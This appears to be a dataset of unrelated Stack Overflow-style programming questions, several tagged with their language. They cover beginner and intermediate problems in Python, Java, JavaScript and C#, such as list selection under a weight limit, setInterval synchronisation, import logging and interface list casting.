escaping two lists in python  so basically i have a really typical issue  i found some solutions from stackoverflow before but this didn t really help me.    i have a school task which requires me to analyze bobsleigh team. i have names  their rating and weight in three separate lists and i need to pick four competitors with best ratings and their weight combined must not be over 325 kg. what i ve already done is i ve created a <code>for</code> cycle which picks out four competitors with highest rating  but the issue is that they may have high ratings but their weight combined is over 325 kg. for example i have three lists:   <pre><code>[ name1   name2   name3   name4   name5   name6   name7   name8 ] ## names [1 2 3 4 5 6 7 8] ##ratings [50 60 70 80 90 100 110 120] ##weights </code></pre>   what i get is <code>[5 6 7 8]</code> (and every single one of them has a according weight list and name list  for example for rating 5 goes competitor with weight of 90 kg and name is name 5) but their weight combined is higher than 325kg (90+100+110+120 >      325)    i ve done coding so far that the minimal element (5) is removed and replaced by another  lower element  but the issue occurs (by issue i mean i don t know how to do it) when switching the last element is not enough and i need to try to replace element 6 and keep the element 5 in place.    right now the code for switching is:   <pre><code>while (kaalude_summa &gt; 325): #if weight is over 325 kg     positsioon = reiting.index(max(reiting)) #position for max rating     if kaalud[positsioon] &lt; kaalude_tulemused[3]: #two lists - one is for elements not in the resulting list (kaalud) and one is for the elements in resulting list (kaalude_tulemused)         kaalude_tulemused[3] = kaalud[positsioon] #sets new weight in result list         tulemuslist.remove(min(tulemuslist)) #removes number 5 from example list [5 6 7 8] (check above)         tulemuslist.append(max(reiting)) #adds number 4 from example list         kaalude_summa = kaalude_summa - vahekaal + kaalude_tulemused[3] #new calculated weight     reiting.remove(max(reiting)) #removes element from list [1 2 3 4]     kaalud.remove(kaalud[positsioon]) </code></pre>   this works as long as the competitors with rating 1 2 3 or 4 weight + other three weights (6 7 8) isn t bigger than 325.    i understand this could be done somehow with two for loops but i tried three times and failed miserably.    it is compulsory to write code in estonian in our school so i apologize for not writing in english.    i really hope that what i wrote is readable and you are able to help me. thank you in advance.,python

"I've implemented the TestDbAsync fakes from <a href=https://msdn.microsoft.com/en-us/library/dn314429(v=vs.113).aspx rel=noreferrer>https://msdn.microsoft.com/en-us/library/dn314429(v=vs.113).aspx</a> and I want to be able to use AutoMapper to project to a different type before calling the Async EF methods (ToListAsync, CountAsync, etc.). 

I get a cast exception in ProjectionExpression.To

Example code that throws the exception.

<pre><code>_userRepository.GetAll().OrderBy(x =&gt; x.Id).ProjectTo&lt;User&gt;.ToListAsync();
</code></pre>

This works fine in a non-test scenario, but when I mock the DbSet using the TestDbAsyncEnumerable I get 

<pre><code>: Unable to cast object of type 'Namespace.TestDbAsyncEnumerable`1[UserEntity]' to type 'System.Linq.IQueryable`1[User]'.

Right now to get around this I have to ProjectTo after the call to the Async EF extensions. Is there any way to keep the ProjectTo call before the EF extensions?

        return GetAsyncEnumerator();

javascript - making 2 setinterval() be synchronous  i have 2 functions calling setinterval but i need them to be synchronous. here is my code(yes  they are really simple).   <pre><code>var number1 = 0;  function caller(){   go();   come(); }  function go() {   anim1 = setinterval( doactiongo()   20); }  function come() {   anim2 = setinterval( doactioncome()   20); }  function doactiongo(){   if(number1 &lt; 1023) {     number1++;   } else {     clearinterval(anim1);   } }  function doactioncome() {   if (number1 &gt; 0) {     number1 = number1 - 1   } else {    clearinterval(anim2);  } </code></pre>   functions doactiongo() and doactioncome() would be any code. does anybody know how to solve it     regards!,javascript

I want to check a condition in several controllers, based on a unique id that is passing into the controller.

here is the code for actionfilter.

    public class AnswerCompletedAttribute : System.Web.Http.Filters.ActionFilterAttribute, IActionFilter
    {
        public string p { get; set; }

        public void OnActionExecuted(ActionExecutedContext filterContext)
        {
            throw new NotImplementedException();
        }

        public void OnActionExecuting(ActionExecutingContext filterContext)
        {
            if (filterContext.ActionParameters.ContainsKey(p))
            {
                var id = filterContext.ActionParameters[p] as Guid?;
                if (Db.IsRespondentAnswerCompleted(id))
                {
                    filterContext.Result = new RedirectToRouteResult(

                }
            }
        }
    }

And my code in the controller,

    [AnswerCompleted(p = uniqueId)]

solved having problems finding the error mentioned below that keeps program from running  i m having some problems running the program. whenever  i try i get the java.util.inputmismatchexception.  after searching about it  i noticed that it s when i try to get data but the next data isn t of that format ( in beginner terms ). i ve tried multiple times to find what is causing the error  but i can t seem to find it :/    and for those who find this to be sloppy  since arrays aren t used. i am not allowed to use them for this particular assignment.    <a href= https://i.stack.imgur.com/oa4dt.png  rel= nofollow noreferrer ><img src= https://i.stack.imgur.com/oa4dt.png  alt= error ></a>,java

using python as the config language for a python program  i d like to dynamically import various settings and configurations into my python program - what you d typically do with a .ini file or something similar.    i started with json for the config file syntax  then moved to yaml  but really i d like to use python. it ll minimize the number of formats and allow me to use code in the config file  which can be convenient.    i hacked up an <code>__import__</code> based system to allow this using code that looks like:   <pre><code>account_config = __import__(settings.config_dir +  .account_name   fromlist=[settings.config_dir]) </code></pre>   it basically works  but i m running into all kinds of esoteric problems - eg. if i try to import  test  it picks up some internal python library that s in the python path instead of my test.     so i m wondering: is using python as the configuration language for a python program viable or am i asking for trouble  are there examples i can steal from,python

do weaker/less specific types in java affect performance   consider the following bits of java code:   <pre><code>for(arraylist&lt;string&gt; str : strlist) {     // something }  for(iterable&lt;string&gt; str : strlist) {     // something } </code></pre>   depending on what happens inside the loop  it may well not be necessary to use arraylist or list  but we can instead of iterable.    does this have a performance benefit or is it purely a conceptual thing where you define it to tell the reader of the code that this is all you ll ever be doing with the object,java

"I'm trying to understand how the new features C# newer version work.Actually when visual studio 2015 was launched it had new features like for instance NULL Condition operator ( ? ). when i worked using this and pushed the code to the guthub.all others who pulled this code and were using visual studio 2012 couldn't compile the code for the compiler complained about this operator.

I have <strong>three questions</strong> regarding this.

Question 1  is - <strong>does this mean its the new IDE in visual studio 2015 that recognises it i.e its IDE dependent ? IDE understands it and compiles it replacing it with appropriate code.isn't it the .NET framework feature ?</strong>  

Question 2 is - <strong>does this mean, if i use a different editor but the same .NET framework it won't work.</strong>

Question 3 is - <strong>aren't newer features that come regularly with new versions of C# dependent on .NET framework ? if not ? where from does it get those feature ?</strong>

how can i log all imports that are executed in a block of code   i m writing a test suite  and the code i m testing makes excessive use of delayed module imports.  so it s possible that with 5 different inputs to the same method  this may end up importing 5 additional modules.  what i d like to be able to do is set up tests so that i can assert that running the method with one input causes one import  and doesn t cause the other 4.    i had a few ideas of how to start on this  but none so far have been successful.  i already have a custom importer  and i can put the logging code in the importer.  but this doesn t work  because the import statements only run once.  i need the log statement to be executed regardless of if the module has been previously imported.  just running <code>del sys.modules[ modname ]</code> also doesn t work  because that runs in the test code  and i can t reload the module in the code being tested.    the next thing i tried was subclassing <code>dict</code> to do the monitoring  and replace sys.modules with this subclass.  this subclass has a reimplemented <code>__getitem__</code> method  but calling <code>import module</code> doesn t seem to trigger the <code>__getitem__</code> call in the subclass.  i also can t assign directly to <code>sys.modules.__getitem__</code>  because it is read-only.    is what i m trying to do even possible     <strong>update</strong>    nneonneo s answer seems to only work if the implementation of <code>logimports()</code> is in the same module as where it is used.  if i make a base test class containing this functionality  it has problems.  the first is that it can t find just <code>__import__</code>  erroring with:   <pre><code>#     old_import = __import__ # unboundlocalerror: local variable  __import__  referenced before assignment </code></pre>   when i change that to <code>__builtin__.__import__</code>  i another error:    myunittest.py:   <pre><code>import unittest class testcase(unittest.testcase):     def logimports(self):         old_import = __builtins__.__import__         def __import__(*args  **kwargs):             print args  kwargs             return old_import(*args  **kwargs)          __builtins__.__import__ = __import__ </code></pre>   test.py:   <pre><code>import myunittest import unittest class realtest(myunittest.testcase):     def setup(self):         self.logimports()     def testsomething(self):         import unittest         self.asserttrue(true) unittest.main()  #     old_import = __builtins__.__import__ # attributeerror:  dict  object has no attribute  __import__  </code></pre>,python

I know how to change foreground of an entire list item, but I am not aware how to change ellipse stroke colour.To change Foreground color for ListBox , I implemented below code

what s the difference between float.positive_infinity and float.max_value   what s the difference between <code>float.positive_infinity</code> and <code>float.max_value</code>  which is greater  are they the same     i came accross them looking for a value that would be greater than every other <code>float</code> or failing that all except the greatest. does either meet that criteria     thanks!,java
how to overwrite the previous print to stdout in python   if i had the following code:   <pre><code>for x in range(10):      print x </code></pre>   i would get the output of   <pre><code>1 2 etc.. </code></pre>   what i would like to do is instead of printing a newline  i want to replace the previous value and overwrite it with the new value on the same line.,python
generate co-ordinates that do not overlap  i have a program that is randomly positioning line elements. however  i would like for these lines not to overlap or cross with each other (lines do not touch at all).     looking up examples on how to do this generally uses a loop to loop through the number of line elements and generate a co-ordinate  then another loop within that loop to check if the co-ordinate is at the minimum distance.     from my experience thus far  using loops really tax the program  and when displaying the stimuli  frames tend to drop.     another thought i had on doing this is to generate a list of co-ordinates  then calculate the distance of each of those. the codes i have thus far are as below:   <pre><code>import numpy as np import scipy.spatial.distance import random  length_line=12 nlines = 1000  #the number of line elements that i want  #random coordinates for the lines. 500x500 pixels centred around 0 xys = np.random.random([nels 2])*500-250     #calculating the distance of the centre of the lines from each other dist = scipy.spatial.distance.pdist(xys)  mindist = (length_line/2)+2  #the minimum distance that should not cause overlap  print sys </code></pre>   i am not quite sure how to progress from here - ideally i would like the program to keep co-ordinates that have a minimum distance that is more then the set <code>mindist</code>  and probably replace co-ordinates that aren t with something else.     is this possible  thank you.,python
variable life time in java script  assume that  i have following a codes in document.ready event   <pre><code>$(function(){       var a=1;       $( #btn ).on( click  function(){           a++;           var b=1;           function foo(){                alert(a*b);                b++;           }      }  } </code></pre>   in this case  what is the life time of variable  a  and  b . is new  b  allocated in every call of click event and previous b deleted by garbage collector,javascript

how to calculate average from a dropdown excluding the  n/a  values  have a client that i have built a simple form for that does basic calculations.  there are 6 drop downs that all contain n/a  1  2  3.  and at the end a overall average is calculated from these drop downs.  client is wanting to totally ignore any drop downs that contain n/a meaning if n/a is in 2 of the 6 drop downs then a average should only be calculated on 4 drop downs.   i am just lost on the logic or if statement needed to tell the total field to ignore a certain drop down field if user has selected n/a.    here is my code and is not working..please suggest some ideas.   <pre><code>&lt;html&gt; &lt;head&gt;&lt;script type= text/javascript &gt; var afieldnames = new array(); afieldnames[ n/a ]=0; afieldnames[ 1 ]=1; afieldnames[ 2 ]=2; afieldnames[ 3 ]=3; var ncount = 0; var nsum = 0; event.value = 0; for(i = 0; i &lt; afieldnames.length; i++) { if(this.getfield(afieldnames[i]).valueasstring !=  n/a )  { ncount++; nsum += parsefloat(this.getfield(afieldnames[i]).value); } } if(ncount != 0)   { event.getelementbyid( bpover ).value = nsum / ncount;  } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;select name= value[]  onchange= alert(this.value): &gt;  &lt;option name= n/a &gt;n/a&lt;/option&gt;   &lt;option name= 1 &gt;1&lt;/option&gt;    &lt;option name= 2 &gt;2&lt;/option&gt;     &lt;option name= 3 &gt;3&lt;/option&gt;   &lt;/select&gt;&lt;br&gt;    &lt;select name= value[]  onchange= alert(this.value): &gt;   &lt;option name= n/a &gt;n/a&lt;/option&gt;    &lt;option name= 1 &gt;1&lt;/option&gt;    &lt;option name= 2 &gt;2&lt;/option&gt;    &lt;option name= 3 &gt;3&lt;/option&gt;    &lt;/select&gt;&lt;br&gt;     &lt;select name= value[]  onchange= alert(this.value): &gt;    &lt;option name= n/a &gt;n/a&lt;/option&gt;    &lt;option name= 1 &gt;1&lt;/option&gt;     &lt;option name= 2 &gt;2&lt;/option&gt;     &lt;option name= 3 &gt;3&lt;/option&gt;     &lt;/select&gt;&lt;br&gt;      &lt;select name= value[]  onchange= alert(this.value): &gt;    &lt;option name= n/a &gt;n/a&lt;/option&gt;     &lt;option name= 1 &gt;1&lt;/option&gt;     &lt;option name= 2 &gt;2&lt;/option&gt;     &lt;option name= 3 &gt;3&lt;/option&gt;     &lt;/select&gt;&lt;br&gt;     &lt;select name= value[]  onchange= alert(this.value): &gt;    &lt;option name= n/a &gt;n/a&lt;/option&gt;    &lt;option name= 1 &gt;1&lt;/option&gt;     &lt;option name= 2 &gt;2&lt;/option&gt;      &lt;option name= 3 &gt;3&lt;/option&gt;     &lt;/select&gt;&lt;br&gt;     &lt;br&gt;    avg &lt;input type= text  name= average  id= bpover  readonly&gt;     &lt;/body&gt;     &lt;/html&gt; </code></pre>,javascript
assigning functions as attributes of an object  then calling without the implied  self  arguement   python allows you to assign a pre-defined function to a class as an attribute  such as   <pre><code>def fish_slap(fish):     # do something  class dance(object):     dance_move=fish_slap </code></pre>   however  if we try do say   <pre><code>d=dance() d.dance_move( halibut ) </code></pre>   we get the get the following error   <pre><code>typeerror: fish_slap() takes exactly 1 arguement (2 given) </code></pre>   python seems to be viewing this as a object method and providing the implied  self  argument. fair enough  it seems i ve just learned that assigning a function as an attribute in this way is equivalent to defining the function directly within the class. i can see that this is a useful feature.    however  in this case this is not what i want. in my application i have statistical models encoded as different classes which also have their own  train  methods for training the model parameters against supplied data. in order to do this  an objective function that you wish to minimize (or maximize) the value of needs to be supplied. an example simple objective function is say   <pre><code>def rmse(predicted observed):      root mean squared error      return sp.sqrt(sp.mean((predicted-observed)**2)) </code></pre>   where scipy has been imported as sp. these objective functions are defined in a single .py file and used throughout my code and naturally exists as standalone functions  rather than as class methods with the implied  self  argument.      i want to be able to set the desired objective function as an attribute so that any subsequent work a model object does uses that function  for instance   <pre><code>some_model=somemodel(initial_parameter_values_guess)  some_model.objective_function = rmse some_model.train(training_data) predictions_rmse = some_model.predict() some_mode.objective_function = mae predictions_mae = some_model.predict() </code></pre>   in this example is seems i could just pass the objective function as an argument to train  however in my application there is a lot more one would want to do and it seems to make more sense to be able to set/get the objective function rather than repeatedly providing it as an argument.    there are any number of workarounds to achieve this basic behavior  but what is the most pthonic approach     note that my current code is python2 and python3 compliant. if there are version specific solutions please point that out. i am running with python2 in order to be able to use matplotlib however i am trying to ensure the code is python3 compatible apart from that module.,python

    public interface IMyInterface
    {
        string MY_VALUE { get; set; }
    }

    public class MyClass: IMyInterface
    {
        public string MY_VALUE { get; set; }
    }

I am using the class in a list:

    private List<MyClass> MyInternal;
    public List<IMyInterface> MyExternal
    {
        get
        {
            return MyInternal;
        }
    }

Add I am calling the external property like this:

    MyService.MyExternal.Add(new MyClass{ MY_VALUE:New Value });

The problem here is that MyInternalis of type MyClass so the get function have error.

However, if I cast MyInternalto IMyInterface first, it would get rid of the error but would stop being useful because it's a new list and not the original list:

    public List<IMyInterface> MyExternal
    {
        get
        {
            return MyInternal.Select(x=>(IMyInterface)x).ToList();
        }
    }

How do I make this work?",c#
i need help making a loop in an if-else statement in java <pre><code>import java.util.scanner; public class phonenumberformat {      public static void main(string [] args) {          //create the scanner class for user input         scanner keyboard = new scanner(system.in);          system.out.println( please enter your phone number:  );         string number = keyboard.next();          /* separate the number into the three categories i want          * side-note: since we can assume that the phone number will be 10 digits long i don t          *      have to figure out the length of the number that the user will input          */         string area_code = number.substring(0 3);         string first_three = number.substring(3 6);         string rest = number.substring(6 10);            int new_number = integer.parseint(number);         if (new_number &lt; 10){             system.out.println( it seems that you have entered an invalid phone number  please try again! );             /* i want to make a loop here so that if the user accidentally enters more of less than               *      a 10 digit number it will loop the  please enter your phone number:   part so               *      java won t give an error              */         } else {             //concatenate the number properly so that it is formatted nicely             string formatted_number =  (  + area_code +  )  +     + first_three +  -  + rest;         }          string final_number = integer.tostring(formatted_number);          //print the newly formatted number         system.out.println(formatted_number);     }     } </code></pre>   so this program is supposed to format a phone number from 1112223333 to (111) 222-3333. the assignment said that we can assume that the user will input an unformatted phone number  however i want to put in a little safety so that if the user by change happens to input a number that isn t 10 digits long instead of an error it will prompt them to re-enter the number. thanks!,java
"The problem can be expressed in a simple way like this: Given a control handle (IntPtr), how do we know if it is of a `ListBox` or in general it would be better if we know what kind of control it is.

I mentioned about `ListBox` here as a native win32 ListBox, not a wrapper in Windows Forms. Also suppose that the ListBox creator does not put any info (such as the plain text ListBox) inside the class name of the ListBox (the class name can be obtained using `GetClassName` function.

I need to do this because I need to determine if there is any native win32 ListBox under a certain screen point. The first step is to find the control handle using `WindowFromPoint` function, but next we need to check if the found handle is of a ListBox or not.

I've Googled for hours without finding anything interesting. Thank you for your help!",c#
